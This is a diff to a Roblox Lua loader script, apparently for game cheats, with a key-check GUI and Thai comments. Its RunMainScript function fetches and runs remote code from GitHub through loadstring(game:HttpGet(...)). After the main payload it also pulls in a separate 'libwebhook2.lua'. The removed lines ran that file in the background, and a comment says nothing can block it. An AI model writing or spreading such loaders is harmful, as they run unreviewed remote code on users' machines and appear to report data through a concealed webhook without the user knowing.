@@ -1,4 +1,4 @@
--- 🔥🔥🔥🔥9
+-- 🔥🔥🔥🔥10
 
 local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
@@ -39,30 +39,15 @@ local function SafeHttpRequest(requestData)
     return nil
 end
 
-local TARGET_PLACE_ID = 93978595733734
-
 local function RunMainScript()
-    -- 1. แยก Webhook ออกมาทำงานแบบอิสระ 100% ใน Background (ไม่มียทางโดนสคริปต์หลักบล็อก)
-    task.spawn(function()
-        pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/x2sxqz/Libwtf/refs/heads/main/libwebhook2.lua"))()
-        end)
-    end)
-
-    -- 2. รันสคริปต์หลักแยกตามเกม (PlaceID หรือเกมปกติ)
-    if game.PlaceId == TARGET_PLACE_ID then
-        pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/x2sxqz/Violence-District/refs/heads/main/test1.lua"))()
-        end)
+    if _G.Script_Language == "Thai" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Swiftz007/Normal/refs/heads/main/Thaixyz.lua"))()
     else
-        pcall(function()
-            if _G.Script_Language == "Thai" then
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/x2sxqz/Normal/refs/heads/main/Thaixyz.lua"))()
-            else
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/x2sxqz/Normal/refs/heads/main/kingxyz.lua"))()
-            end
-        end)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Swiftz007/Normal/refs/heads/main/kingxyz.lua"))()
     end
+    
+    task.wait(2)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Swiftz007/Libwtf/refs/heads/main/libwebhook2.lua"))()
 end
 
 local API = {}
@@ -365,9 +350,11 @@ local function Build()
 	introLogo.ZIndex = 100
 	introLogo.Parent = screen
 
+	-- รอ 1 วินาที แล้วขยายโลโก้ให้ใหญ่ขึ้น
 	task.wait(1.0)
 	Utils.Tween(introLogo, {Size = UDim2.new(0, 80, 0, 80)}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
 
+	-- รออีก 2 วินาที แล้วเปลี่ยนเป็นหน้าต่าง GUI หลัก
 	task.wait(2.0)
 	introLogo:Destroy()
 
@@ -650,7 +637,9 @@ local function Build()
 		sImg.Image = icon
 	end
 
+	-- 🟢 อนิเมชั่นปิดตัวแบบย้อนกลับ (Reverse Close Animation) เมื่อคีย์ถูกต้อง
 	local function PlayCloseAnimation(onComplete)
+		-- 1. ซ่อนเนื้อหาภายใน Main GUI ทิ้งก่อน
 		for _, child in ipairs(main:GetChildren()) do
 			if child:IsA("GuiObject") then
 				Utils.Tween(child, {BackgroundTransparency = 1}, 0.2)
@@ -662,10 +651,12 @@ local function Build()
 			end
 		end
 
+		-- 2. ย่อขนาด Main GUI หลักให้หดลงเหลือขนาดโลโก้ตรงกลาง
 		Utils.Tween(main, {Size = UDim2.new(0, 0, 0, 0)}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In)
 		task.wait(0.4)
 		main.Visible = false
 
+		-- 3. สร้างโลโก้เดี่ยวขึ้นมาแทนที่ในขนาดเท่าโลโก้ใหญ่ แล้วย่อจิ๋วลงจนหายไป พร้อมจางเบลอ
 		local outLogo = Instance.new("ImageLabel")
 		outLogo.Size = UDim2.new(0, 80, 0, 80)
 		outLogo.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -676,7 +667,7 @@ local function Build()
 		outLogo.ZIndex = 200
 		outLogo.Parent = screen
 
-		SetBlur(false)
+		SetBlur(false) -- ปิดเบลอฉากหลังค่อยๆ จางหาย
 
 		Utils.Tween(outLogo, {Size = UDim2.new(0, 0, 0, 0), ImageTransparency = 1}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In)
 		task.wait(0.4)
@@ -703,6 +694,7 @@ local function Build()
 			ToastSystem.Create(screen, "Access granted!", "success")
 			task.wait(0.8)
 
+			-- 🟢 เรียกใช้อนิเมชั่นย้อนกลับตอนปิดตัว GUI
 			PlayCloseAnimation(function()
 				screen:Destroy()
 				RunMainScript()
@@ -768,3 +760,4 @@ if keyToCheck then
 end
 
 Build()
+
